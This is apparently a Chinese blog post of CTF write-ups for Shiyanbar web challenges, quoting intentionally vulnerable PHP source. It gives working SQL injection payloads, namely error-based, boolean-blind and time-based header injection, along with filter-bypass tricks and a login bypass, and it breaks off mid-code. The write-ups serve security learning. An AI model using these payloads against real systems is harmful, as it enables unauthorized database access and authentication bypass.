    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最近在刷CTF题，主攻Web，兼职Misc<br><a id="more"></a></p><h2 id="Shiyanbar"><a href="#Shiyanbar" class="headerlink" title="Shiyanbar"></a>Shiyanbar</h2><h3 id="0x01-简单的登陆题"><a href="#0x01-简单的登陆题" class="headerlink" title="0x01 简单的登陆题"></a>0x01 简单的登陆题</h3><h4 id="简单概括："><a href="#简单概括：" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点： %00截断正则 CBC字节翻转攻击  </li><li>难度： 难  </li><li>WP：<a href="https://blog.csdn.net/include_heqile/article/details/79942993" target="_blank" rel="noopener">https://blog.csdn.net/include_heqile/article/details/79942993</a>  </li></ul><h4 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h4><p>F12查看响应头，发现返回tips<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/08/5cab35507b9c4.png"><br>访问test.php文件得到源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &#39;***********&#39;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;conn.php&#39;);</span><br><span class="line">function sqliCheck($str)&#123;</span><br><span class="line">if(preg_match(&quot;&#x2F;\\\|,|-|#|&#x3D;|~|union|like|procedure&#x2F;i&quot;,$str))&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv&#x3D;&#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.&#x3D;chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line">function login($info)&#123;</span><br><span class="line">$iv &#x3D; get_random_iv();</span><br><span class="line">$plain &#x3D; serialize($info);</span><br><span class="line">    $cipher &#x3D; openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">global $link;</span><br><span class="line">    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))&#123;</span><br><span class="line">        $cipher &#x3D; base64_decode($_COOKIE[&#39;cipher&#39;]);</span><br><span class="line">        $iv &#x3D; base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain &#x3D; openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info &#x3D; unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">            $sql&#x3D;&quot;select * from users limit &quot;.$info[&#39;id&#39;].&quot;,0&quot;;</span><br><span class="line">            $result&#x3D;mysqli_query($link,$sql);</span><br><span class="line">            </span><br><span class="line">            if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link)))&#123;</span><br><span class="line">            $rows&#x3D;mysqli_fetch_array($result);</span><br><span class="line">echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&#39;.$rows[&#39;username&#39;].&#39;&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; (string)$_POST[&#39;id&#39;];</span><br><span class="line">    if(sqliCheck($id))</span><br><span class="line">die(&quot;&lt;h1 style&#x3D;&#39;color:red&#39;&gt;&lt;center&gt;sql inject detected!&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">    $info &#x3D; array(&#39;id&#39;&#x3D;&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    echo &#39;&lt;h1&gt;&lt;center&gt;Hello!&lt;&#x2F;center&gt;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&#39;cipher&#39;]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#39;&lt;body class&#x3D;&quot;login-body&quot; style&#x3D;&quot;margin:0 auto&quot;&gt;</span><br><span class="line">                &lt;div id&#x3D;&quot;wrapper&quot; style&#x3D;&quot;margin:0 auto;width:800px;&quot;&gt;</span><br><span class="line">                    &lt;form name&#x3D;&quot;login-form&quot; class&#x3D;&quot;login-form&quot; action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;&#x2F;h1&gt;</span><br><span class="line">                        &lt;span&gt;input id to login&lt;&#x2F;span&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name&#x3D;&quot;id&quot; type&#x3D;&quot;text&quot; class&#x3D;&quot;input id&quot; value&#x3D;&quot;id&quot; onfocus&#x3D;&quot;this.value&#x3D;\&#39;\&#39;&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;p&gt;&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot; class&#x3D;&quot;button&quot; &#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;&#x2F;form&gt;</span><br><span class="line">                &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;&#x2F;body&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure><br>代码分析：  </p><ul><li>sqliCheck函数负责过滤sql注入</li><li>get_random_iv 生成16位随机数(Asicc范围在0~255内)iv</li></ul><p>漏洞原因：<br>aes-128-cbc加密存在CBC翻转攻击(不理解，暂时跳过)</p><h3 id="0x02-后台登录"><a href="#0x02-后台登录" class="headerlink" title="0x02 后台登录"></a>0x02 后台登录</h3><h4 id="简单概括：-1"><a href="#简单概括：-1" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：md5()函数16位二进制格式绕过，<code>md5(&quot;ffifdyop&quot;,True)</code>得到的加密字符串为<code>&#39;or&#39;6&lt;crash&gt;</code>(注：<code>or &#39;数字+字母&#39;</code> 等价于<code>or true</code>)  </li><li>难度：易  </li><li>WP：<a href="https://blog.csdn.net/qq_36791003/article/details/81746730" target="_blank" rel="noopener">https://blog.csdn.net/qq_36791003/article/details/81746730</a>  </li></ul><h4 id="解题过程：-1"><a href="#解题过程：-1" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开网页，右键查看源代码发现源码：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/08/5cab35767dac4.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $password&#x3D;$_POST[&#39;password&#39;];</span><br><span class="line">$sql &#x3D; &quot;SELECT * FROM admin WHERE username &#x3D; &#39;admin&#39; and password &#x3D; &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</span><br><span class="line">$result&#x3D;mysqli_query($link,$sql);</span><br><span class="line">    if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">        echo &#39;flag is :&#39;.$flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &#39;密码错误!&#39;;</span><br><span class="line">    &#125; --&gt;</span><br></pre></td></tr></table></figure><br>上网查了下，了解到md5($password,true)返回的是<strong>原始 16 字符二进制格式</strong>的密文,返回的内容可以存在单引号，故我们可以找个字符串，使其md5(str,true)加密过返回的字符串与原sql语句拼接造成SQL注入攻击。<br>经过简单的Fuzz,我们知道：字符串<code>&#39;or&#39;6&lt;乱码&gt;&quot;</code>，此时如果拼接到sql语句中，那么这条语句将会变成一条永真式，因此成功登录，获得flag。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/08/5cab35767372d.png">  </p><h3 id="0x03-加了料的报错注入"><a href="#0x03-加了料的报错注入" class="headerlink" title="0x03 加了料的报错注入"></a>0x03 加了料的报错注入</h3><h4 id="简单概括：-2"><a href="#简单概括：-2" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li><ul><li>考点：双参数注释绕过，<code>=</code>被过滤可用<code>regexp &#39;xxx&#39;</code>和<code>in (0xaaaa)</code>代替</li></ul></li><li>难度： 中  </li><li>WP：<a href="https://www.jianshu.com/p/95f18a32ec7b" target="_blank" rel="noopener">https://www.jianshu.com/p/95f18a32ec7b</a>  </li></ul><h4 id="解题过程：-2"><a href="#解题过程：-2" class="headerlink" title="解题过程："></a>解题过程：</h4><p>观察题目可知此题考的是报错注入，右键源代码得到提升：Post发送username&amp;password。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/08/5cab35769ace0.png"><br>sql语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;select * from users where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;;</span><br></pre></td></tr></table></figure><br>注意：此处可控的参数有两个。<br>简单手工测试，发现过滤了<code>#，and</code>等关键字，而且username处单独过滤了右括号，这意味着我们无法再username出使用函数，因而我们将目光转向password。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/08/5cab357692922.png"><br>经过一番人工Fuzz，发现只有exp()函数没有被过滤，故我们构造语句：<code>exp(~(select * from(select user())a))</code>成功爆出用户名。<br>最终我们的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;a&#39;&#x2F;*&amp;password&#x3D;*&#x2F;Or exp(~(select * from(select database())a))or&#39;1 </span><br><span class="line">&#x2F;&#x2F;查询当前数据库</span><br><span class="line">username&#x3D;a&#39;&#x2F;*&amp;password&#x3D;*&#x2F;Or exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema regexp &#39;error_based_hpf&#39;)a))or&#39;1 </span><br><span class="line">&#x2F;&#x2F;查询表名，此处由于&#x3D;被过滤，我们使用regexp来绕过</span><br><span class="line">username&#x3D;a&#39;&#x2F;*&amp;password&#x3D;*&#x2F;Or exp(~(select * from(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)a))or&#39;1</span><br><span class="line">&#x2F;&#x2F;查询列名，此处由于and被过滤，故而不加数据库名的验证，在实际渗透中最好还是尽量加上。</span><br><span class="line">username&#x3D;a&#39;&#x2F;*&amp;password&#x3D;*&#x2F;Or exp(~(select * from(select group_concat(value) from ffll44jj)a))or&#39;1</span><br><span class="line">&#x2F;&#x2F;获取flag</span><br></pre></td></tr></table></figure></p><h3 id="0x04-认真一点！"><a href="#0x04-认真一点！" class="headerlink" title="0x04 认真一点！"></a>0x04 认真一点！</h3><h4 id="简单概括：-3"><a href="#简单概括：-3" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：双层叠加绕过过滤，大小写绕过，from()for()代替偏移，布尔盲注  </li><li>难度：难  </li><li>WP：<a href="https://blog.csdn.net/xingyyn78/article/details/79747404" target="_blank" rel="noopener">https://blog.csdn.net/xingyyn78/article/details/79747404</a>  </li></ul><h4 id="解题过程：-3"><a href="#解题过程：-3" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开网页，随便输入个数字，页面返回<code>You are in...</code>，输入在数字后加单引号，返回<code>You are not in...</code>。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/08/5cab407181198.png"><br>猜测此处考的是bool盲注，根据页面返回的内容判断真假。<br>经过一番简单的fuzz，发现此处过滤的函数只会过滤一次，那么我们可以将过滤关键词双写：<code>oorr</code>就好了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;aaa&#39;oorr(1&#x3D;1)&#x3D;&#39;1  &#x2F;&#x2F;返回You are in</span><br><span class="line">id&#x3D;aaa&#39;oorr(1&#x3D;2)&#x3D;&#39;1  &#x2F;&#x2F;返回You are not in</span><br><span class="line">&#x2F;&#x2F; 此处的aaa是为了让前边条件为假，那么sql语句的判断将依赖于后边的语句</span><br><span class="line">&#x2F;&#x2F; 即：false ∪ (条件一) &#x3D; 条件一</span><br></pre></td></tr></table></figure><br>我们先判断数据库长度：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;aaa&#39;oorr(length(database())&gt;1)&#x3D;&#39;1</span><br></pre></td></tr></table></figure><br>其次循环取数据库名进行判断：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;aaa&#39;oorr(mid((select+database())from(1)foorr(1))&#x3D;&#39;c&#39;)&#x3D;&#39;1 </span><br><span class="line">&#x2F;&#x2F;由于,被过滤，使用from与for进行绕过，记得for要写成foorr绕过过滤，+号绕过空格过滤</span><br></pre></td></tr></table></figure><br>接着循环判断表名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;aaa&#39;oorr(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;database()))from(1)foorr(1))&#x3D;&#39;a&#39;)&#x3D;&#39;1</span><br></pre></td></tr></table></figure><br>之后就不写了，与上边类似，写脚本跑就好。  </p><h3 id="0x05-你真的会PHP吗？"><a href="#0x05-你真的会PHP吗？" class="headerlink" title="0x05 你真的会PHP吗？"></a>0x05 你真的会PHP吗？</h3><h4 id="简单概括：-4"><a href="#简单概括：-4" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：is_numeric函数的绕过(%20|%00)、PHP32位系统整数型变量最大值为：<code>2147483647</code>(2^31-1) 64位：<code>9223372036854775807</code>(2^63-1)  </li><li>难度：中  </li><li>WP：<a href="https://blog.csdn.net/JBlock/article/details/78745513" target="_blank" rel="noopener">https://blog.csdn.net/JBlock/article/details/78745513</a>  </li></ul><h4 id="解题过程：-4"><a href="#解题过程：-4" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，发现返回头存在提示信息：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/09/5cac89ded0e73.png"><br>打开链接获得源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$info &#x3D; &quot;&quot;; </span><br><span class="line">$req &#x3D; [];</span><br><span class="line">$flag&#x3D;&quot;xxxxxxxxxx&quot;;</span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&#39;number&#39;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key &#x3D;&gt; $value) &#123; </span><br><span class="line">        $value &#x3D; trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] &#x3D; addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number &#x3D; strval($number); </span><br><span class="line">    $i &#x3D; 0; </span><br><span class="line">    $j &#x3D; strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !&#x3D;&#x3D; $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line">if(is_numeric($_REQUEST[&#39;number&#39;]))&#123;</span><br><span class="line">     $info&#x3D;&quot;sorry, you cann&#39;t input a number!&quot;;</span><br><span class="line">&#125;elseif($req[&#39;number&#39;]!&#x3D;strval(intval($req[&#39;number&#39;])))&#123;</span><br><span class="line">     $info &#x3D; &quot;number must be equal to it&#39;s integer!! &quot;;  </span><br><span class="line">&#125;else&#123;</span><br><span class="line">     $value1 &#x3D; intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 &#x3D; intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line">     if($value1!&#x3D;$value2)&#123;</span><br><span class="line">          $info&#x3D;&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info &#x3D; &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info&#x3D;$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $info;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>代码流程：<br><code>is_numeric[false] &amp;&amp; $req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))[false]</code><br>-&gt; <code>$value1!=$value2[false]</code><br>-&gt; <code>is_palindrome_number($req[&quot;number&quot;])[true]</code>  </p><p><strong>我们知道is_numeric函数与ereg函数一样，存在截断漏洞，而第二个if判断存在弱类型比较的漏洞，我们将这两个漏洞组合起来打一套组合拳。</strong><br>PHP语言对于32位系统的int变量来说，最大值是2147483647，如果我们传入的数值为2147483647的话，经过strrev函数反转再转成int函数仍是2147483647，因为746384741&gt;2147483647，转成int变量会减小成2147483647，故而绕过看似矛盾的条件。<br>而对于开始的is_numeric，加上%00或%20即可，此时is_numeric函数便不会认为这是个数字，而对于下边的strval()in、intval()却无影响。<br>综上所述，我们的number应为：2147483647%00、2147483647%20、%002147483647。</p><blockquote><p>此处%20不能再开头的原因是intval()会将其转换成数字0，而%00无影响。  </p></blockquote><p><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/09/5cac89deb6100.png"></p><h3 id="0x06-登陆一下好吗"><a href="#0x06-登陆一下好吗" class="headerlink" title="0x06 登陆一下好吗??"></a>0x06 登陆一下好吗??</h3><h4 id="简单概括：-5"><a href="#简单概括：-5" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：登录框万能密码  </li><li>难度：中  </li><li>WP：<a href="https://blog.csdn.net/h1012946585/article/details/79851884" target="_blank" rel="noopener">https://blog.csdn.net/h1012946585/article/details/79851884</a>  </li></ul><h4 id="解题过程：-5"><a href="#解题过程：-5" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开页面，猜测考的是万能密码，手动Fuzz发现过滤了or，故改用<code>&#39;=&#39;</code>成功。</p><h3 id="0x07-who-are-you"><a href="#0x07-who-are-you" class="headerlink" title="0x07 who are you?"></a>0x07 who are you?</h3><h4 id="简单概括：-6"><a href="#简单概括：-6" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：时间盲注，and case when () then () else () end绕过逗号过滤。  </li><li>难度：中  </li><li>WP：<a href="https://blog.csdn.net/wy_97/article/details/75643252" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/75643252</a>  </li></ul><h4 id="解题过程：-6"><a href="#解题过程：-6" class="headerlink" title="解题过程："></a>解题过程：</h4><p>抓包，发现回显的数据貌似是直接取header的值，没有经过数据库，使用报错注入失败，猜测是盲注，由于bool盲注返回的页面一致，故此题应为时间盲注：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/09/5cac910608206.png"><br>简单测试发现逗号被过滤，导致我们无法使用if语句，不过我们可以换成case when then else语句代替：</p><ul><li>X-Forwarded-For: 127.0.0.1’and case when(length(database())&gt;1)then(sleep(5))else(sleep(0))end and ‘1  </li></ul><p>剩下的就是写脚本慢慢跑了，此处略过。</p><h3 id="0x08-因缺思汀的绕过"><a href="#0x08-因缺思汀的绕过" class="headerlink" title="0x08 因缺思汀的绕过"></a>0x08 因缺思汀的绕过</h3><h4 id="简单概括：-7"><a href="#简单概括：-7" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：<code>gourp by xxx with rollup limit 1 offset x#</code>【创建虚拟表最后一行为pwd的值为NULL，借用offset偏移到最后一个，post传输空的pwd，满足条件】  </li><li>难度：中  </li><li>WP：<a href="https://blog.csdn.net/qq_35078631/article/details/54772798" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/54772798</a>  </li></ul><h4 id="解题过程：-7"><a href="#解题过程：-7" class="headerlink" title="解题过程："></a>解题过程：</h4><p>右键源代码得到提示信息<code>source.txt</code>，打开得到源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) &#123;</span><br><span class="line">echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;&lt;input name&#x3D;&quot;uname&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;&lt;input name&#x3D;&quot;pwd&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;&lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;&lt;&#x2F;form&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue&#x3D;implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;&#x2F;&quot;.$ArrReq.&quot;&#x2F;is&quot;,$StrValue)&#x3D;&#x3D;1)&#123;   </span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key&#x3D;&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con &#x3D; mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">die(&#39;Could not connect: &#39; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db&#x3D;&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM interest WHERE uname &#x3D; &#39;&#123;$_POST[&#39;uname&#39;]&#125;&#39;&quot;;</span><br><span class="line">$query &#x3D; mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) &#x3D;&#x3D; 1) &#123; </span><br><span class="line">    $key &#x3D; mysql_fetch_array($query);</span><br><span class="line">    if($key[&#39;pwd&#39;] &#x3D;&#x3D; $_POST[&#39;pwd&#39;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span 